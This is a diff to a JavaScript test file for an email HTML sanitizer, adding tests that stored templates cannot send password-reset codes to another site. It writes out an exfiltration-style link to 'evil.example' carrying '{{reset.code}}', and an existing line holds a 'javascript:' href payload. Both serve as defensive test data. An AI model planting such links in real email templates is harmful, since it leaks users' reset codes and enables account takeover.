@@ -62,6 +62,8 @@ test("sanitizer keeps the allowlist and drops everything else", () => {
   assert.equal(sanitizeEmailHtml('<a href="javascript&#58;alert(1)">x</a>'), "<a>x</a>");
   assert.equal(sanitizeEmailHtml('<a href="https://a.example/?q=1&amp;r=2" target="_blank">x</a>'), '<a href="https://a.example/?q=1&amp;r=2">x</a>');
   assert.equal(sanitizeEmailHtml('<a href="{{entry.url}}">Go</a>'), '<a href="{{entry.url}}">Go</a>');
+  assert.equal(sanitizeEmailHtml('<a href="https://evil.example/?c={{reset.code}}">Reset</a>'), "<a>Reset</a>");
+  assert.equal(sanitizeEmailHtml('<a href="{{reset.url}}?c={{reset.code}}">Reset</a>'), "<a>Reset</a>");
   assert.equal(
     sanitizeEmailHtml('<span data-placeholder="user.firstName" class="chip">{{user.firstName}}</span>'),
     '<span data-placeholder="user.firstName">{{user.firstName}}</span>',
@@ -87,6 +89,19 @@ test("every email type has a default that only uses its catalog fields", () => {
   for (const field of ["entry.hours", "entry.date", "user.firstName", "organization.name"]) {
     assert.ok(field in emailTemplateFields.LoggedTime);
   }
+});
+
+test("a stored template cannot send a code to another site", () => {
+  const stored = {
+    subject: "Reset",
+    heading: "Reset",
+    preview: "",
+    template: '<p><a href="https://evil.example/?c={{reset.code}}">Reset your password</a></p>',
+  };
+  const rendered = renderEmail(stored, { reset: { code: "424242", url: "https://clocked.example/forgot-password" } });
+  assert.doesNotMatch(rendered.html, /evil\.example/);
+  assert.doesNotMatch(rendered.text, /evil\.example/);
+  assert.doesNotMatch(rendered.html, /424242/);
 });
 
 test("rendered defaults keep the mailed code lines and code box", () => {
